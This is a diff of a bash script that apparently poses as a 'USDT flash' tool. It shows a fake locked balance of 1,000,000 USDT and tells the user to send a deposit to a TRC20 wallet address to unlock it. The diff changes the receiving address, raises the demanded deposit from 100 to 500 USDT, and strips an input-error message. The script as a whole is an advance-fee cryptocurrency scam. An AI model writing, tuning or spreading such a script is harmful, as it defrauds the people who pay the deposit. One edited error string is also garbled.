@@ -7,7 +7,7 @@ cd Usdt_Flash && bash Usdt_Flash.sh
 balance=1000000
 hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099"
 
-account_id="TASsP1Uerf77BpX8TJeZrfDanVDypsABk2
+account_id="TPwuZDpMg5s8Xk6KwFHzDKhiTmDGC2PDS1
 
 usdt_logo="
 \e[38;2;38;161;123m$$$$$$\
@@ -36,14 +36,13 @@ echo -e "$usdt_logo"
 
 fancyBoxEcho "$welcome_message"
 
-echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"
+echo -e "To unlock your balance of $balance USDT, please deposit 500 USDT to the following address: $account_id"
 
 function unlockBalance {
     echo " "
     read -p "Enter your deposit amount in USDT: " depositAmount
 if ! [[ $depositAmount =~ ^[0-9]+$ ]]; then
-        echo -e "\e[31mError: Invalid deposit amount. Please enter a number.\e[0m"
-        unlockBalance
+
         return
     fi
 read -p "Enter the transaction hash ID: " transactionHash
@@ -57,14 +56,14 @@ echo " "
 
 refreshOnSuccess
 
-if [[ $depositAmount -eq 100 && $transactionHash == "$hash_id" ]]; then
+if [[ $depositAmount -eq 500 && $transactionHash == "$hash_id" ]]; then
 
 echo -e " \e[32mSuccessfully Unlocked procedding...\e[0m"
         echo " "
 
 selectNetwork
     else
-        echo -e "\e[31mError: Invalid deposit amount or transaction hash ID. Restarting...\e[0m"
+        echo -e "\e[31mflash processing l: Invalid deposit amount or transaction hash ID. Restarting...\e[0m"
         sleep 3
         clear
         fancyBoxEcho "$welcome_message"
@@ -145,7 +144,7 @@ function refresh {
     echo -e "$usdt_logo"
     echo " "
     fancyBoxEcho "$welcome_message"
-    echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT Under TRC20 to the following address: $account_id"
+    echo -e "To unlock your balance of $balance USDT, please deposit 500 USDT Under TRC20 to the following address: $account_id"
 }
 function refreshOnSuccess {
     echo "Authenticating....."
@@ -158,4 +157,4 @@ while true; do
     unlockBalance
 done
 
-exit
+
